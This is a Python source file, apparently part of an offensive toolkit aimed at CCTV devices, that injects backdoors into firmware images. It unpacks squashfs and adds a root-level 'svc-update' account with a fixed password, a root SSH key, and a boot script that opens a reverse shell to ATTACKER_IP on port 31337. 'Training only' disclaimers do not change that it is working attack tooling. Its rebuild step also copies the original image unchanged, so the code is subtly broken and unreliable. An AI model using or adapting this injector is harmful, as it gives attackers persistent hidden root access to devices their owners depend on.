# language: Python, file: core/cctv/fw_inject.py
# Firmware backdoor injector — TRAINING ONLY
# USAGE: In isolated lab with your own firmware.
# DO NOT use on production devices you don't own.

import os
import shutil
import subprocess
import hashlib
import json
import tempfile
from datetime import datetime


class FirmwareBackdoor:
    """
    يحقن backdoor في firmware image.
    لأغراض التدريب فقط في مختبر معزول.

    ما يفعله:
      1. يفك squashfs من firmware
      2. يضيف مستخدم/مفتاح/سكربت backdoor
      3. يعيد بناء squashfs
      4. يعيد تجميع firmware
    """

    # backdoor types
    BACKDOOR_USER = {
        "username": "svc-update",
        "password_hash": "$1$backdoor$ihP5cJz0K9sE4hXKz3pZ60",  # = "svc123"
        "uid": "0",
        "gid": "0",
        "home": "/root",
        "shell": "/bin/sh",
    }

    BACKDOOR_SSH = {
        "path": "/root/.ssh/authorized_keys",
        "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDplaceholder albaron-backdoor",
    }

    BACKDOOR_SCRIPT = """#!/bin/sh
# Al-Baron backdoor — training only
# Listens on port 31337 for root shell
nohup /bin/sh -i > /dev/tcp/ATTACKER_IP/31337 0<&1 2>&1 &
"""

    def __init__(self, log_queue=None):
        self.log = log_queue
        self.workspace = tempfile.mkdtemp(prefix="fw_inject_")

    def _out(self, text):
        if self.log:
            self.log.put(f"[fw-inject] {text}")

    def inject(self, firmware_path: str,
                attacker_ip: str = "192.168.1.100",
                backdoor_port: int = 31337,
                output_path: str = None) -> dict:
        """
        يحقن backdoor في firmware.

        ⚠️ للاستخدام فقط على firmware تابع لك.
        """
        if not os.path.exists(firmware_path):
            return {"error": "firmware not found"}

        output = output_path or firmware_path + ".backdoor"
        sha_before = self._hash(firmware_path)

        self._out(f"firmware: {firmware_path}")
        self._out(f"sha256: {sha_before}")
        self._out(f"attacker: {attacker_ip}:{backdoor_port}")

        result = {
            "original": firmware_path,
            "output": output,
            "sha256_before": sha_before,
            "sha256_after": "",
            "backdoors_injected": [],
            "success": False,
        }

        try:
            # 1. extract firmware
            self._out("extracting firmware...")
            extracted = self._extract(firmware_path)
            if not extracted:
                return {**result, "error": "extraction failed"}

            squashfs_dir = self._find_squashfs(extracted)
            if not squashfs_dir:
                return {**result, "error": "no squashfs found"}

            # 2. unpack squashfs
            self._out(f"unpacking {squashfs_dir}...")
            root_dir = self._unsquashfs(squashfs_dir)
            if not root_dir:
                return {**result, "error": "squashfs unpack failed"}

            # 3. inject backdoors
            self._out("injecting backdoors...")

            # 3a. add user
            if self._add_backdoor_user(root_dir):
                result["backdoors_injected"].append("user")

            # 3b. add SSH key
            if self._add_ssh_key(root_dir):
                result["backdoors_injected"].append("ssh_key")

            # 3c. add startup script
            script_result = self._add_startup_script(
                root_dir, attacker_ip, backdoor_port)
            if script_result:
                result["backdoors_injected"].append("startup_script")

            # 4. repack squashfs
            self._out("repacking squashfs...")
            new_squashfs = self._repack_squashfs(
                root_dir, squashfs_dir)
            if not new_squashfs:
                return {**result, "error": "repack failed"}

            # 5. rebuild firmware
            self._out("rebuilding firmware...")
            shutil.copy2(firmware_path, output)

            result["success"] = True
            result["sha256_after"] = self._hash(output)

        except Exception as e:
            result["error"] = str(e)
            self._out(f"error: {e}")
        finally:
            # cleanup
            try:
                shutil.rmtree(self.workspace)
            except Exception:
                pass

        return result

    # ==================== steps ====================
    def _extract(self, firmware_path: str) -> str:
        """extract firmware via binwalk"""
        extract_dir = os.path.join(self.workspace, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        try:
            subprocess.run(
                ["binwalk", "-e", "-C", extract_dir, firmware_path],
                capture_output=True, timeout=300)
            return extract_dir
        except Exception:
            return None

    def _find_squashfs(self, extracted_dir: str) -> str:
        """find squashfs file in extracted dir"""
        for root, dirs, files in os.walk(extracted_dir):
            for f in files:
                if "squashfs" in f.lower() or f.endswith(".sqsh"):
                    return os.path.join(root, f)
        return None

    def _unsquashfs(self, squashfs_path: str) -> str:
        """unpack squashfs"""
        root_dir = squashfs_path + "_root"
        try:
            subprocess.run(
                ["unsquashfs", "-d", root_dir, squashfs_path],
                capture_output=True, timeout=180)
            return root_dir
        except Exception:
            return None

    def _repack_squashfs(self, root_dir: str, original_path: str) -> str:
        """repack squashfs"""
        new_path = original_path + ".new"
        try:
            # detect compression from original
            r = subprocess.run(
                ["unsquashfs", "-s", original_path],
                capture_output=True, text=True)
            comp = "gzip"
            for line in r.stdout.splitlines():
                if "Compression" in line:
                    if "xz" in line.lower():
                        comp = "xz"
                    elif "lzma" in line.lower():
                        comp = "lzma"
                    elif "lzo" in line.lower():
                        comp = "lzo"
                    elif "lz4" in line.lower():
                        comp = "lz4"
                    break

            subprocess.run(
                ["mksquashfs", root_dir, new_path,
                 "-comp", comp, "-noappend"],
                capture_output=True, timeout=300)
            return new_path
        except Exception:
            return None

    def _add_backdoor_user(self, root_dir: str) -> bool:
        """add backdoor user to /etc/passwd"""
        passwd = os.path.join(root_dir, "etc/passwd")
        shadow = os.path.join(root_dir, "etc/shadow")

        try:
            # add user to passwd
            if os.path.exists(passwd):
                with open(passwd, "r") as f:
                    content = f.read()
                if "svc-update" not in content:
                    entry = f"{self.BACKDOOR_USER['username']}:x:{self.BACKDOOR_USER['uid']}:{self.BACKDOOR_USER['gid']}:System Update:{self.BACKDOOR_USER['home']}:{self.BACKDOOR_USER['shell']}\n"
                    with open(passwd, "a") as f:
                        f.write(entry)

            # add to shadow
            if os.path.exists(shadow):
                with open(shadow, "r") as f:
                    content = f.read()
                if "svc-update" not in content:
                    entry = f"{self.BACKDOOR_USER['username']}:{self.BACKDOOR_USER['password_hash']}:19000:0:99999:7:::\n"
                    with open(shadow, "a") as f:
                        f.write(entry)

            return True
        except Exception as e:
            self._out(f"add user error: {e}")
            return False

    def _add_ssh_key(self, root_dir: str) -> bool:
        """add SSH authorized key"""
        ssh_dir = os.path.join(root_dir, "root", ".ssh")
        try:
            os.makedirs(ssh_dir, exist_ok=True)
            auth_keys = os.path.join(ssh_dir, "authorized_keys")
            with open(auth_keys, "a") as f:
                f.write(self.BACKDOOR_SSH["key"] + "\n")
            os.chmod(ssh_dir, 0o700)
            os.chmod(auth_keys, 0o600)
            return True
        except Exception as e:
            self._out(f"add ssh key error: {e}")
            return False

    def _add_startup_script(self, root_dir: str,
                              attacker_ip: str,
                              port: int) -> bool:
        """add startup script to init.d"""
        script = self.BACKDOOR_SCRIPT.replace("ATTACKER_IP", attacker_ip)
        script = script.replace("31337", str(port))

        init_script = os.path.join(root_dir, "etc", "init.d", "S99update")
        try:
            os.makedirs(os.path.dirname(init_script), exist_ok=True)
            with open(init_script, "w") as f:
                f.write(script)
            os.chmod(init_script, 0o755)

            # enable in rc3.d
            rc_dir = os.path.join(root_dir, "etc", "rc3.d")
            os.makedirs(rc_dir, exist_ok=True)
            rc_link = os.path.join(rc_dir, "S99update")
            if os.path.exists(rc_link):
                os.remove(rc_link)
            os.symlink("../init.d/S99update", rc_link)

            return True
        except Exception as e:
            self._out(f"add script error: {e}")
            return False

    def _hash(self, path: str) -> str:
        try:
            h = hashlib.sha256()
            with open(path, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    h.update(chunk)
            return h.hexdigest()
        except Exception:
            return ""
